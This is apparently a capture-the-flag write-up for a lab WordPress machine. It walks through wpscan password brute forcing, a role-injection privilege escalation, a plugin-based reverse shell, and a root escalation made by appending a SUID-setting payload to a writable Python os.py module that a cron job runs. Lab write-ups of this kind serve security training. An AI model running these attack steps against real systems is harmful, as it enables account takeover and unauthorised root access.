*Target Ip. Address: 10.49.160.147*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.49.160.147

```

We have 2 ports. Port 22 (ssh) and Port 80 (http, running wordpress site). As the challenege has told to add jack.thm on our hosts file, let's do it.

```bash
kali@kali:cat /etc/hosts
10.49.160.147   jack.thm
 
127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

The website is a basic wordpress site. Let's quickly enumerate it with wpscan.

```bash
kali@kali:wpscan --url http://jack.thm --enumerate u --no-update --api-token=75...Vc

We find lot's of vulnerabilities in wordpress version, they either need some privileges or are of no use. But we have 3 user enumerated and have XMLPRC enabled. Let's brute force, using the wpscan only.

```bash
kali@kali:wpscan --url http://jack.thm -t 3 -P /usr/share/wordlists/rockyou.txt -U users.txt --no-update
```

Using rockyou.txt took a lot of time, so I ran the brute force using a smaller wordlist.

```bash
kali@kali:wpscan --url http://jack.thm -t 3 -P /usr/share/wordlists/fasttrack.txt -U users.txt --no-update

And, it was success. We found a password for user wendy. Let's login to wordpress.

It seems we are not an administrator, so there is not a lot we can do here. The hint for the challenge is 'ure_other_roles.

Quick search led me to this exploit: "*https://www.exploit-db.com/exploits/44595*".

There is a metasploit module also available, or we can do manually also.

We just have to add the &ure_other_roles=administrator& to the Request before &action while updating the profile. So, intercept the profile update request using burpsuite and add the changes.

We are now admin. We will activate one of the plugins, edit it with the php reverse shell.

Start the listener.

We get the first flag at jack's home directory. And there is another clue/hint for us.

```bash
www-data@jack:/home/jack$ cat reminder.txt 

Please read the memo on linux file permissions, last time your backups almost got us hacked! Jack will hear about this when he gets back.

Let's check the backups directory if there is anything that may help us.

We have a ssh key for user jack. We can bring it over our attacker machine, change permissions and login as jack via ssh.

We are in as user jack. But we have no sudo permissions, no SUID. 

I brought linpeas and looked through found nothing that could help us. The sudo version was vulnerable but for that we needed sudoedit permssions.

Then, I brought pspy64.

```bash
2026/02/23 20:20:17 CMD: UID=0     PID=1      | /sbin/init 
2026/02/23 20:22:01 CMD: UID=0     PID=29098  | /usr/bin/python /opt/statuscheck/checker.py 
2026/02/23 20:22:01 CMD: UID=0     PID=29097  | /bin/sh -c /usr/bin/python /opt/statuscheck/checker.py 
2026/02/23 20:22:01 CMD: UID=0     PID=29096  | /usr/sbin/CRON -f 
2026/02/23 20:22:01 CMD: UID=0     PID=29099  | /usr/bin/python /opt/statuscheck/checker.py 
2026/02/23 20:22:01 CMD: UID=0     PID=29100  | sh -c /usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log
```

We have /opt/statuscheck/checker.py running as cron job by user root. Let's check it.

```bash
jack@jack:/opt/statuscheck$ cat checker.py 
import os

os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
```

A simple curl pointing to 127.0.0.1, we have no permissions to edit /etc/hosts, so it doesn't help us much.

```bash
jack@jack:/opt/statuscheck$ ls -la
total 28
drwxr-xr-x 2 root root  4096 Jan 10  2020 .
drwxr-xr-x 3 root root  4096 Jan 10  2020 ..
-rw-r--r-- 1 root root    92 Jan 10  2020 checker.py
-rw-r--r-- 1 root root 13266 Feb 23 20:22 output.log
```

We only have the read permissions only. Now, let's check it's dependencies.

```bash
jack@jack:/opt/statuscheck$ find / -name "os.py" 2>/dev/null
/usr/lib/python3.5/os.py
/usr/lib/python2.7/os.py
```

There are 2 versions of os.py. Let's check our permissions.

```bash
jack@jack:/opt/statuscheck$ ls -la /usr/lib/python3.5/os.py
-rw-r--r-- 1 root root 36970 Nov 12  2018 /usr/lib/python3.5/os.py
jack@jack:/opt/statuscheck$ ls -la /usr/lib/python2.7/os.py
-rw-rw-r-x 1 root family 25908 Nov 16  2020 /usr/lib/python2.7/os.py
```

It seems group family has write permissions on os.py using python2.7. 

```back
jack@jack:/opt/statuscheck$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1001(family)
```

And we are in family group. That is all we need. Now, we can edit the os.py, when the cron runs, it will execute our code.

```bash
jack@jack:/opt/statuscheck$ echo 'import os; os.system("chown root:root /bin/bash && chmod 4755 /bin/bash")' >> /usr/lib/python2.7/os.py
```

I added a simple python script at the end to make /bin/bash SUID, so that we can be root.

```bash
jack@jack:/opt/statuscheck$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
```

After some time, we see /bin/bash is root. Now, we can become root.

```bash
jack@jack:/opt/statuscheck$ /bin/bash -p
bash-4.3# id
uid=1000(jack) gid=1000(jack) euid=0(root) groups=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1001(family)
```

That was great. Let's end the challenge by reading final flag.

```bash
bash-4.3# cat root.txt
b8...fb
```
